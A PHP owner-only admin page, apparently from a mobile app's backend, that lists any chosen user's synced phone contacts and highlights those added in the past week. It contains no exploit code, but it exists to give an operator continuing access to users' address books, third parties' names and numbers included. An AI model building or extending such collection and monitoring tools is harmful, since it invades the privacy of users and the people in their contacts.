<?php
require_once __DIR__ . '/_boot.php';
ss_require_owner();

$uid = (int)($_GET['user'] ?? 0);
$q   = trim((string)($_GET['q'] ?? ''));
$users = $pdo->query("SELECT id, username, name FROM users WHERE role='user' ORDER BY name")->fetchAll();

$all = []; $newly = []; $total = 0;
if ($uid) {
    try {
        $where = "user_id = " . $uid;
        if ($q !== '') { $where .= " AND (name LIKE " . $pdo->quote('%'.$q.'%') . " OR phone LIKE " . $pdo->quote('%'.$q.'%') . ")"; }
        $all = $pdo->query("SELECT name, phone, first_seen, last_seen FROM contacts WHERE $where ORDER BY name IS NULL, name, phone")->fetchAll();
        $total = count($all);
        // Newly added = first_seen within the last 7 days.
        $newly = $pdo->query("SELECT name, phone, first_seen FROM contacts WHERE user_id=$uid AND first_seen >= DATE_SUB(NOW(), INTERVAL 7 DAY) ORDER BY first_seen DESC")->fetchAll();
    } catch (\Throwable $e) {}
}

$PAGE_TITLE = 'Contacts';
$PAGE_SUB   = 'All saved contacts + newly added (last 7 days)';
$PAGE_ICON  = '📇';

$PAGE_TOOLS = '<form method="get" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><select class="sel" name="user" onchange="this.form.submit()"><option value="0">Select a user…</option>';
foreach ($users as $uu) $PAGE_TOOLS .= '<option value="'.(int)$uu['id'].'" '.($uid===(int)$uu['id']?'selected':'').'>'.ss_admin_h($uu['name']).'</option>';
$PAGE_TOOLS .= '</select><input class="sel" type="text" name="q" value="'.ss_admin_h($q).'" placeholder="Search name / number" style="min-width:180px"></form>';

require __DIR__ . '/_dark_head.php';
?>
<div class="cards">
  <div class="stat"><div class="h"><span class="dot">📇</span> Total Contacts</div><div class="v"><?= $total ?></div></div>
  <div class="stat"><div class="h"><span class="dot">🆕</span> New (7 days)</div><div class="v"><?= count($newly) ?></div></div>
</div>

<?php if(!$uid): ?>
  <div class="panel"><div class="empty">Select a user to see their contacts. (Only appears if they manually granted Contacts access.)</div></div>
<?php else: ?>

  <?php if($newly): ?>
  <div class="panel">
    <h3>🆕 Newly Added — last 7 days</h3>
    <div style="overflow-x:auto"><table>
      <thead><tr><th>Name</th><th>Number</th><th>Added</th></tr></thead>
      <tbody>
      <?php foreach($newly as $c): ?>
        <tr>
          <td><b><?= ss_admin_h($c['name'] ?: '—') ?></b></td>
          <td style="font-variant-numeric:tabular-nums"><?= ss_admin_h($c['phone']) ?></td>
          <td style="color:var(--mut)"><?= date('d M H:i', strtotime($c['first_seen'])) ?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table></div>
  </div>
  <?php endif; ?>

  <div class="panel">
    <h3>📇 All Contacts (<?= $total ?>)</h3>
    <?php if(!$all): ?>
      <div class="empty">No contacts synced yet. They appear only if the user manually enabled Contacts permission for the app.</div>
    <?php else: ?>
      <div style="overflow-x:auto;max-height:640px;overflow-y:auto"><table>
        <thead><tr><th>Name</th><th>Number</th><th>First seen</th></tr></thead>
        <tbody>
        <?php foreach($all as $c): $isNew = strtotime($c['first_seen']) >= strtotime('-7 days'); ?>
          <tr>
            <td><?= ss_admin_h($c['name'] ?: '—') ?><?php if($isNew): ?> <span class="pill" style="background:rgba(34,197,94,.16);color:#4ade80;font-size:.62rem">NEW</span><?php endif; ?></td>
            <td style="font-variant-numeric:tabular-nums"><?= ss_admin_h($c['phone']) ?></td>
            <td style="color:var(--mut)"><?= date('d M Y', strtotime($c['first_seen'])) ?></td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table></div>
    <?php endif; ?>
  </div>
<?php endif; ?>
<?php require __DIR__ . '/_dark_foot.php';
